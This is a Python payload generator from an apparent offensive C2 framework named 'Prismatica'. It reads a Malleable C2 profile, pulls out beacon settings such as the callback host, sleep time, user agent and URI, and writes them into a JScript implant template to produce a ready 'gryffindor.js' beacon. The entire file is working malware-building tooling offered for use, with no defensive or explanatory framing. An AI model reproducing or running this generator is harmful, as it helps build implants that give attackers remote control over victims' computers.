import os
import sys

print("Generating Gryffindor payload")
print("")

LHOST = sys.argv[1]
try:
    mc2profile = sys.argv[2]
except:
    mc2profile = "default.profile"


from os.path import expanduser
home = expanduser("~")

prismdir = os.path.join(home, ".prismatica")
payload = os.path.join(prismdir, "gryffindor.js")
template = os.path.join(prismdir, "Diagon", "Arsenal", "templates", "gryffindor.js")
c2profile = os.path.join(prismdir, "Diagon", "Arsenal", "c2profiles", mc2profile)

#Get Payload Template
f = open(template, "r")
tmp = f.read()

#Process C2 Profile
print("Processing Malleable C2 Profile...")
with open(c2profile) as c:
    # do stuff with fp
   line = c.readline()
   conf = []
   settings = []
   while line:
       conf.append(line)
       line = c.readline()
   i = 0
   while i < len(conf):
       if "#" not in conf[i]:
           confline = conf[i].lstrip()
           if "{" in confline:
               #Get module header
               context = confline.split("{")[0]
               i += 1
               j = 0
               #Iterate through sub module
               while j != 1:
                   confline = conf[i].lstrip()
                   if confline.startswith("set"):
                       #print(confline.split(' ')[1] + ": " + confline.split('"')[1])
                       setting = {
                           "context": context,
                           "name": confline.split(' ')[1],
                           "value": confline.split('"')[1]
                       }
                       settings.append(setting)

                   #Check for sub module
                   elif "{" in confline:
                       subcontext = confline.split("{")[0]
                       i += 1
                       k = 0
                       while k != 1:
                           confline = conf[i].lstrip()
                           if len(confline) > 2:
                               setting = {
                                   "context": context,
                                   "subcontext": subcontext,
                                   "name": confline.split(' ')[0],
                                   "value": confline[len(confline.split(' ')[0]):]
                               }
                               settings.append(setting)

                           if "}" in confline:
                               k = 1
                           i += 1


                   elif "}" in confline:
                       j = 1

                   i += 1


           elif confline.startswith("set"):
              setting = {
                "context": "global",
                "name": confline.split(' ')[1],
                "value": confline.split('"')[1]
              }
              settings.append(setting)

       i += 1

#print(settings)
#payloadsettings
lhost = "var LHOST = '" + LHOST + "';\n"
uri = "var uri = '" + LHOST + "';\n"

print("Payload C2 Settings")
headers = []
for setting in settings:
    #Load Global Settings
    if setting["context"] == "global":
        if setting["name"] == "sleeptime":
            sleep = setting["value"]
        elif setting["name"] == "jitter":
            jitter = setting["value"]
        elif setting["name"] == "maxdns":
            maxdns = setting["value"]
        elif setting["name"] == "useragent":
            useragent = setting["value"]

    try:
        if setting["context"] == "http-get " and setting["subcontext"] == "client " and setting["name"] == "header":
            headers.append(setting["value"])
    except:
        try:
            if setting["context"] == "http-get " and setting["name"] == "uri":
                uri = setting["value"]
        except:
            pass

    print(setting)


setlhost = "var LHOST = '" + LHOST + "';\n"
setsleep = "var beaconTime = " + str(int(sleep)*1) + ";\n"
try:
    setuseragent = "var useragent = '" + useragent + "';\n"
except:
    print("User Agent not specified using default: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
    setuseragent = "var useragent = '" + "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" + "';\n"
seturi = "var uri = '" + uri + "';\n"

setconf = setlhost + setsleep + setuseragent + seturi
w = open(payload, "w")
w.write(setconf)
w.close()
w = open(payload, "a")
w.write(tmp)
#print(f.read())

#os.system("copy C:\\Projects\\Prismatica\\Diagon\\Gryffindor\\wsh\\gryffindor.js C:\\Projects\\Prismatica\\gryffindor.js")

print("Payload Details:")
print("=========================================")
print("C2 Profile: " + mc2profile)
print("LHOST: " + LHOST)
print("BEACONTIME: " + sleep)
print("Saving payload to engagement directory")
print("Saved to: " + payload)
print("Complete!")
